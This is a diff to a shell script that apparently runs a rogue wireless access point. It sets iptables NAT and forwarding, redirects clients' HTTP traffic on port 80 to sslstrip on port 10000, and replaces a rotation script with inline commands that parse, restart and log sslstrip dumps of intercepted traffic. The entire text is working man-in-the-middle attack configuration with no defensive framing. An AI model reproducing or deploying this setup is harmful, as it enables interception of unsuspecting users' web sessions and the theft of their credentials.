@@ -19,6 +19,15 @@ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
 iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
 iptables -t nat -A PREROUTING -s 192.168.100.0/24 -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-/usr/local/src/logex/sslstrip_rotate.sh
+
+date=`date "+%Y-%m-%dT%H:%M:%S"`
+cd /usr/local/src/logex/sslstrip_parser
+nice -n 10 ./sslstrip_parser.py >> /var/log/sslstrip/parser-$date
+killall -15 sslstrip
+sleep 3
+nice -n -10 sslstrip -f -w /var/log/sslstrip/dump-$date >> /var/log/sslstrip_daemon.log &
+rm sslstrip.log
+ln -s /var/log/sslstrip/dump-$date sslstrip.log
+
 ## enabling IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
